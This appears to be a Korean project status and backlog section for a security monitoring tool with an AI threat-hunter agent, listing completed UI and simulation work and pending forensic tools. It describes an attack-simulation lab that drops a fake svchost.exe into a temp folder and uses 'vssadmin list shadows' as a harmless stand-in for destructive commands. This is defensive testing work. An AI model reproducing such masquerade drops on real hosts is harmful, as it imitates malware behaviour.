| 구분 | 컴포넌트 / 위치 | 과거 상태 (Past Mock State) | 조치 완료 내역 (Resolved Implementation) | 반영 커밋 / 상태 |
|---|---|---|---|---|
| **프로세스 트리** | `ProcessGraphView.xaml` 우측 인스펙터 | "프로세스를 선택하십시오" 정적 텍스트 고정 | `SelectedProcessNode` 동적 카드 바인딩 (PID, PPID, 세션, UAC 권한 레벨, 명령줄, 침해사고 배너) 완비 | `6a010ee` |
| **프로세스 트리** | `ProcessGraphView.xaml` 트리 선택 이벤트 | `TreeView.SelectedItemChanged` 미바인딩 | 1차원 평탄화 가상화 `ListView`의 양방향 바인딩 `SelectedItem="{Binding SelectedProcessNode, Mode=TwoWay}"` 연동 완료 | `6a010ee` |
| **프로세스 트리** | `ProcessGraphView.xaml` 프로세스 제어 | 수동 제어(원자적 동결/사살) 액추에이터 버튼 부재 | `SuspendSelectedProcessCommand` ("원자적 동결"), `TerminateSelectedProcessCommand` ("프로세스 사살") 수동 개입 커맨드 완비 | `6a010ee` |
| **프로세스 트리** | `ProcessGraphView.xaml` 새로고침 버튼 | `RefreshFromDbCommand`로 잘못 매핑됨 | `RefreshProcessTreeCommand`로 전용 분리하여 로컬 OS 스냅샷 또는 가상화 트리 리빌드 연동 완료 | `6a010ee` |
| **위협 분석실** | `InvestigationView.xaml` 공격 계통도 라벨 | 타깃 노드 옆 `(격리 사살)` 텍스트 무조건 고정 표기 | `DataTrigger`를 통해 `CRITICAL` ➔ `(격리 사살)`, `BENIGN` ➔ `(정상 복구)`, 기본 ➔ `(동결 수사 중)` 가변 동적 표출 완료 | `6a010ee` |
| **위협 분석실** | `IncidentItemViewModel` 파일 검증 슬롯 | 초기 더미 속성(`AuthenticodeStatus` 등) 고정 노출 | 특정 도구 편향 정적 카드를 전면 제거하고 중앙 ReAct 추론 아코디언에서 모든 도구 결과를 동적 표출하도록 단일화 완료 | `6a010ee` |
| **위협 분석실** | `InvestigationView.xaml` A4 리포트 버튼 | 비활성화 상태 및 툴팁 부재 | `IsEnabled="False"` 및 "준비 중 (QuestPDF 포렌식 리포트 엔진 연동 예정)" 툴팁 적용 완료 | `6a010ee` |
| **시뮬레이션** | `AttackLabWindow.xaml` UI 아키텍처 | 7개 붉은 버튼 나열 및 조잡한 레이아웃 | 좌측 360px 8개 항목 통합 레일 + 우측 스펙 인스펙터/단일 주입 버튼 Master-Detail 디자인 전면 개편 | Phase 5.2 완료 |
| **시뮬레이션** | `MainViewModel.RunScenarioAsync` | `Task.Delay(350)` 및 고정 로그 문자열 출력 (스텁) | `AttackLabScenarioRunner` 연동을 통한 CQRS 인프로세스 주입, AI 헌터 실시간 수사 및 관제 콘솔 사건 격발 실연동 완료 | Phase 5.2 완료 |
| **시뮬레이션** | `AttackLabScenarioRunner.cs` | 클래스 부재 (단일 책임 원칙 위배 위험) | 신설 서비스 구축: OS 비동기 프로세스 스폰/종료(`WaitForExitAsync`), SSOT 판결 기반 사살, 고아 프로세스 청소, 시나리오 #7 DAG 스트레스 실측, JSON 감사 리포트 직렬화 | Phase 5.2 완료 |
| **시뮬레이션** | `AttackScenarioRegistry.cs` 위치 | `tools/Phalanx.AttackSimulator`에 단독 고립 | `src/Phalanx.Cockpit/Scenarios/`로 이관 완료 및 7대 표준 시나리오 + 동적 커스텀 빌더 완비 | Phase 5.2 완료 |
| **시뮬레이션** | `AttackLabWindow.xaml` 모드 제어 및 안전성 | 단순 2단계 모드 및 라이브 페이로드 미지원 | `AttackLabMode` 3-모드(`CleanRoom`, `OsHybrid`, `LiveExpert`) 체계 확립, `Live` 위험 경고 배너 및 C++ 커널 센서 온라인/오프라인 상태 배지 실시간 연동, Safe Weaponization 및 Teardown 청소 완료 | Phase 5.2.1 완료 |

#### B. 차기 실체화 대기 항목 (Phase 5 Active Backlog / Un-mock Tasks)

| 구분 | 컴포넌트 / 위치 | 현재 상태 (Mock State) | 실제 기대 동작 (Expected Behavior) | 영향도 / 우선순위 |
|---|---|---|---|---|
| **포렌식 도구** | `FileInspectionTool.cs` | 파일 미생성 (미구현) | `WinVerifyTrust` P/Invoke, 시스템 경로 위장(T1036.005) 감별, Shannon 엔트로피 연산 수행 | 차기 1순위 과제 (Phase 5.1 - 복합 회피 턴 단축) |
| **위협 분석실** | `InvestigationView.xaml` A4 리포트 버튼 | `Command` 미연동 (준비 중 안내 툴팁) | 클릭 시 선택된 사건의 수사 기록 및 ReAct 자율 수사 트레이스를 A4 포렌식 PDF로 렌더링/다운로드 (`QuestPDF`) | 차기 2순위 과제 (Phase 5.3 - 감사용 보고서 출력) |
| **포렌식 도구** | `ThreatReputationTool.cs` | 로컬 정적 딕셔너리(`KnownThreatDb` 8건) 기반 | 외부 상용 위협 인텔리전스(VT, OTX 등) 연동 없이 고정된 IoC 테이블 및 RFC 1918 사설망 판별에 의존 | 로컬 전용 1차 구현체 유지 |
| **포렌식 도구** | `SystemFirewallTool.cs` | 비관리자(Non-Admin) 환경 시뮬레이션 분기 | 관리자 권한 미달 시 실제 `netsh advfirewall`을 호출하지 않고 가상 차단 성공 문자열만 반환 | 권한 격리 안전 분기 유지 |

---

### 9.2 계층별 상세 목/스텁 분석

#### A. 관제 콕핏 UI 및 시뮬레이션 계층 (Cockpit UI & Simulation Layer)
1. **`AttackLabWindow` / `AttackLabScenarioRunner` (조치 완료 - Phase 5.2 / 5.2.1)**:
   * **과거 문제점**: UI에 7개의 붉은 버튼이 나열되어 조잡했으며, 시나리오 실행 시 `Task.Delay` 스텁만 동작하여 실제 관제 콘솔에 사건이 연동되지 않음. 또한 실제 공격 페이로드를 구동할 수 없어 Phase 5 도구 결핍(FileInspectionTool 부재)을 디스크 레벨에서 실측할 수 없었음.
   * **조치 완료**:
     * Master-Detail 리스트형 레이아웃으로 UI 전면 개편.
     * `AttackLabScenarioRunner`를 DI 싱글톤으로 신설하여 CQRS 인프로세스 주입, AI 수사관 트리거, OS 비동기 실행(`WaitForExitAsync`), SSOT 기반 사살, 감사 리포트 자동 생성 파이프라인 완비.
     * `AttackLabMode` 3-모드 주입 체계(`CleanRoom`, `OsHybrid`, `LiveExpert`) 도입:
       * `LiveExpert` 모드에서 시나리오 #5의 `C:\Windows\Temp\svchost.exe` 물리 드롭을 재현하고 `[도구 결핍 감지]` 감사 로그를 기록.
       * 호스트 파괴 방지(Safe Weaponization - `vssadmin list shadows`) 및 `try-finally` 고아 프로세스/임시 파일 자동 청소 완비.
       * 붉은색 고시인성 위험 경고 배너 및 C++ 커널 센서 연결 상태(`ONLINE` vs `OFFLINE - UNPROTECTED`) 동적 배지 실시간 표출.
     * `AttackScenarioRegistry.cs`를 Cockpit 내부로 이관하여 격리 해소.

2. **`ProcessGraphView` 우측 인스펙터 및 트리 상호작용 (조치 완료 - 커밋 `6a010ee`)**:
   * Flat Virtualized `ListView` 기반 양방향 바인딩, 우측 인스펙터 상세 카드 바인딩, 수동 동결/사살 커맨드 연동 완료.

3. **`InvestigationView` UI 플레이스홀더 및 고정 라벨 (조치 완료 - 커밋 `6a010ee`)**:
   * 파일 무결성 정적 카드 제거 및 ReAct 아코디언 단일화, 공격 계통도 `DataTrigger` 가변 표출 완비.

#### B. AI 수사관 및 포렌식 도구 계층 (AI Hunter & Forensic Tools Layer)
1. **`FileInspectionTool.cs` 미구현 (Phase 5.1 핵심 과제)**:
   * `src/Phalanx.Cockpit/Tools/` 디렉터리에 해당 파일이 아직 생성되지 않았습니다.
   * 복합 회피 공격(T1036.005) 수사 시 파일 무결성을 확증할 수 없어 `ProcessMemoryScanTool`로 우회 호출되는 병목(21.7초 낭비)이 지속되고 있습니다.
2. **`ThreatReputationTool.cs`의 정적 DB 한계 (장기 과제)**:
   * 8건의 사전 등록된 IoC 외의 새로운 외부 IP 인입 시, 무조건 사살 점수 미달(30점, `INCONCLUSIVE_EXTERNAL_IP`)로 판정되어 복합 증거 수집 단계로 전환됩니다.

---

### 9.3 후속 작업 우선순위 및 단계별 실행 전략 (Execution Sequence)

Phase 4, 4.1 및 Phase 5.2(어택랩 실연동)가 선행 완결되었으므로, 차기 작업은 포렌식 도구 실체화를 중심으로 진행합니다:

1. **[1단계: UI 전면 개편 및 바인딩 완결] [완료 - 커밋 `6a010ee`]**:
   * `ProcessGraphView.xaml`: FlatNodeList `ListView` 양방향 바인딩, 우측 인스펙터, 수동 액추에이터 커맨드 완비.
   * `InvestigationView.xaml`: 공격 계통도 `DataTrigger` 동적 라벨, 파일 무결성 슬롯 배제 및 ReAct 아코디언 단일화 완비.
2. **[2단계: 모의 침해 시뮬레이터 실연동 (AttackLab Live Un-mock)] [완료 - Phase 5.2]**:
   * Master-Detail UI 개편, `AttackLabScenarioRunner` 신설, CQRS 인프로세스 주입, OS 비동기 연동, SSOT 사살 완비.
3. **[3단계: `FileInspectionTool.cs` 구현 및 AI 연동] [차기 1순위 과제 - Phase 5.1]**:
   * `WinVerifyTrust` 기반 서명 검증, 경로 위장(T1036.005) 탐지, 섀넌 엔트로피 분석 엔진 신설.
   * `AutonomousHunterAgent` 프롬프트 및 수사 루프에 정식 도구로 등록하여 복합 회피 공격 수사 시간을 10초 내외로 단축(72% 압축).
4. **[4단계: QuestPDF 기반 A4 포렌식 리포트 출력 엔진 구현] [차기 2순위 과제 - Phase 5.3]**:
   * A4 리포트 버튼 커맨드 연결 및 단일 페이지 PDF 문서 자동 생성 기능 완결.


